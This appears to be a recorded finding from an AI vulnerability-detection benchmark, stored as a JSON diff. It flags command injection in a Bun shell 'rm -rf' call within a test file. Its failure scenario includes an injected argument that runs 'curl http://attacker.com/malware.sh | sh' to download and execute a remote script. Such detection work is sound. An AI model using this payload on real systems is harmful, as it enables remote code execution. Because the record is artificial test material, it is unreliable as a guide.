@@ -1,0 +1,8 @@
+{
+  "key": "d64df11332c40b5f91bb83139647ffc6",
+  "file": "positive/rce/bun-shell-interpolated-path.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"rce\",\n    \"lineNumbers\": [11],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"critical\",\n    \"summary\": \"Unsanitized user-controlled directory path is interpolated into a shell command, enabling command injection.\",\n    \"rationale\": \"Line 11 directly interpolates the `targetDir` parameter into a Bun shell template literal without validation or escaping. The `$` tagged template executes shell commands, and any shell metacharacters (`;`, `&&`, `|`, etc.) in `targetDir` will be interpreted by the shell, allowing an attacker to inject arbitrary commands alongside the intended `rm -rf` operation.\",\n    \"failureScenario\": \"A caller invokes `cleanupWorkspace('/tmp/test; curl http://attacker.com/malware.sh | sh #')`. The shell executes `rm -rf /tmp/test; curl http://attacker.com/malware.sh | sh #`, which first removes the directory, then downloads and executes a malicious script from the attacker's server.\",\n    \"confidence\": 0.95\n  }\n]\n```",
+  "recordedAt": "2026-08-12T04:16:32.948Z",
+  "elapsedMs": 19861.581153018178
+}
